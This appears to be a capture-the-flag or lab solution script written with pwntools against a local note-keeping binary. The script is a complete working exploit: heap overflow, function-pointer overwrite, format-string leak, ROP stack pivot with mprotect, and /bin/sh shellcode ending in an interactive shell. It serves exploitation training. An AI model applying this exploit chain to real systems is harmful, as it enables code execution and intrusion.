# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py and https://github.com/Corb3nik/MBE-Solutions/blob/master/lab7a/solution.py

from pwn import *
import sys
import time

settings = {

    # Path to binary
    "binary"        : "./pwn_notes",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():
    #p = process(binary.path)
    #print("PID: "+str(pidof(p)))
    #pause()
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary
    # The roadmap of this exploit are as follows:
    # 1. Exploit the heap overflow to leak the heap address
    # 2. Exploit the heap overflow again to attain shell
	# First, we overwrite the second message's print_message pointer with printf()'s address, so we can leak the heap.
    # Then we overwrite it for the second time, with an address of the first ROP gadget (stack pivot), with the rest of the
    # chain being delivered to the stack within the print_index()'s local buffer (print_index() calls print_message() overwritten pointer),
    # so it's a parent function and therefore we have some space on the stack below the current ESP to put a small ROP chain
    # while the first instruction will stack pivot by moving ECX (pointing at the print_index()'s local buffer at the time of the call) to ESP.
    shellcode= "\x68\x2f\x73\x68\x00"   # push $0x0068732f
    shellcode += "\x68\x2f\x62\x69\x6e" # push $0x6e69622f
    shellcode += "\x54" 				# push %esp
    shellcode += "\x5b" 				# pop %ebx
    shellcode += "\x6a\x0b"				# push $0xb
    shellcode += "\x58"					# pop %eax
    shellcode += "\x31\xc9"				# xor %ecx, %ecx
    shellcode += "\x31\xd2"				# xor %edx, %edx
    shellcode += "\xcd\x80"				# int $0x80

    shellcode=shellcode.ljust(0x64,"\x90") # ljust to with nops, not really needed

    # Create the FIRST message with len>128 so we can overwrite the len field again when putting the message in
    p.recvuntil("Enter Choice: ")
    p.sendline("1")
    p.recvuntil("[*] Enter data length: ")
    p.sendline("131")
    p.recvuntil("[*] Enter data to encrypt: ")
    payload = "A"*128+"CCC" # these three 'C's will overwrite the length enough for us to write to the next message as much as we want
    p.sendline(payload)


	# Create the SECOND message, so we can overwrite its function pointer while editing the first one, then call it by printing it
    p.recvuntil("Enter Choice: ")
    p.sendline("1")
    p.recvuntil("[*] Enter data length: ")
    p.sendline("50")
    p.recvuntil("[*] Enter data to encrypt: ")
    p.sendline("B"*50)

    # Create the THIRD message with len>128 so we can overwrite the len field of the fourth message
    p.recvuntil("Enter Choice: ")
    p.sendline("1")
    p.recvuntil("[*] Enter data length: ")
    p.sendline("131")
    p.recvuntil("[*] Enter data to encrypt: ")
    payload = "A"*128+"CCC" # these three 'C's will overwrite the length enough for us to write to the next message as much as we want
    p.sendline(payload)

    # Create the FOURTH message, which will hold our format string payload and do our leak for us
    p.recvuntil("Enter Choice: ")
    p.sendline("1")
    p.recvuntil("[*] Enter data length: ")
    p.sendline("50")
    p.recvuntil("[*] Enter data to encrypt: ")
    payload = "B"*50 # content irrelevant here
    p.sendline(payload)

    # Now, edit the FIRST message (#0) to overwrite the pointer
    p.recvuntil("Enter Choice: ")
    p.sendline("2")
    p.recvuntil("[*] Input note index to edit: ")
    p.sendline("0")
    p.recvuntil("[*] Input new note to encrypt: ")
    payload = "A"*128+"CCCC"+"B"*8 # 128 bytes for the message, 4 for the length, 8 for the malloc meta, then the pointer:
    payload = payload + p32(0x08048E78)
    p.sendline(payload)
    # From now on, printing message #1 (SECOND) will lead to print_index() being called FROM print_index() (to groom the stack for the format string leak so the address of the buffer on the heap is within the reach of printf() format string arguments).

    # Now, we edit the THIRD message (#2) so we can overwrite the FOURTH message's pointer with printf() and the payload with our
    # format string "LEAK:%0$p:KEAL" followed by the shellcode, because why not.
    p.recvuntil("Enter Choice: ")
    p.sendline("2")
    p.recvuntil("[*] Input note index to edit: ")
    p.sendline("2")
    p.recvuntil("[*] Input new note to encrypt: ")
    payload = "A"*128+"CCCC"+"B"*8 # 128 bytes for the message, 4 for the length, 8 for the malloc meta, then the pointer:
    payload = payload + p32(0x0804FE00)
    payload = payload + "LEAK:%20$p:KEAL"+shellcode # to kill two birds with one stone, in addition to the format string payload, we also want to use the opportunity of overwriting the FOURTH (#3) messages body to put our actual shellcode to it, to which we will jump from our initial ROP string
    p.sendline(payload)

    # OK, time to leak.

    p.recvuntil("Enter Choice: ")
    p.sendline("4")
    p.recvuntil("[*] Input note index to print: ") # This comes from the regular print_index() call executed from the menu
    p.sendline("1") # We pick message #1 (SECOND) to be printed, which results in print_index() being called from an instance of print_index(), so the stack is now groomed with the address of the SECOND message on the heap.
    p.recvuntil("[*] Input note index to print: ") # This comes from the print_index()->print_index() call, now it's time to run printf() with the format string
    p.sendline("3")
    leak = p.recvuntil(":KEAL",drop=True)
    #print(leak)
    second_message_heap_addr=int(leak[0x9:0x13],16) # 16 means the base for the conversion
    print("Lekaed second message address on the heap: ",hex(second_message_heap_addr))
    # Now we have to calculate the payload locations (FOURTH message's body + offset to jump over the format string payload)
	#payload = payload + p32(0x80bd536) # 0x80bd536 is one of 'mov esp, ecx; ret' gadgets addresses

	# Right, now it's the time to edit the FIRST (#0) message, to overwrite #1-s pointer again. This time instead of print_index, we'll put the address of the stack-pivoting gadget
    mov_ecx_to_esp=0x80bd536 #  0x80bd536 <_Unwind_ForcedUnwind+166>:
    p.recvuntil("Enter Choice: ")
    p.sendline("2")
    p.recvuntil("[*] Input note index to edit: ")
    p.sendline("0") # we have 30 bytes for our first stage ROP shell here
    p.recvuntil("[*] Input new note to encrypt: ")
    payload = "A"*128+"CCCC"+"B"*8 # 128 bytes for the message, 4 for the length, 8 for the malloc meta, then the pointer:
    payload = payload + p32(mov_ecx_to_esp) # we leave the rest of the XOR pad alone, as it already contains our shellcode
    p.sendline(payload)


	# OK, time to trigger the stack-pivoting while providing the first payload to the stack at the same time:
    mprotect_addr=0x806f340  # we need to make our shellcode on the heap executable before jumping to it
    shellcode_addr=second_message_heap_addr+0x233
	# mprotect_addr + shellcode_adddr(first argument for mprotect) + length of the buffer to change flags (shellcode length) + flags (0x7); READ WRITE EXEC
    # 0x80649ebL: pop edi ; pop esi ; pop ebx ;;
    pop3ret=0x80649eb
#    rop_shell=p32(mprotect_addr)+p32(pop3ret)+p32(shellcode_addr)+p32(0x64)+p32(0x7)
    rop_shell=p32(mprotect_addr)+p32(pop3ret)+p32(0x080ee000)+p32(0x24000)+p32(0x7)
    rop_shell=rop_shell+p32(shellcode_addr) # total 21 bytes of the first stage shellcode/ROPchain
    p.recvuntil("Enter Choice: ")
    p.sendline("4")
    p.recvuntil("[*] Input note index to print: ")
    p.sendline("1"+rop_shell) # we have 30 bytes for our first (and last, as our shellcode is not ROP) stage ROP shell here

    p.interactive()

#######################
    try:
        leak = p.recvline()
    except EOFError:
	    sys.exit(1)


    return 0

# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    p = process(binary.path)
    #p = remote("127.0.0.1", 7741)

    if not p:
        log.warning("Failed to run anything.")
        exit()

    exploit()
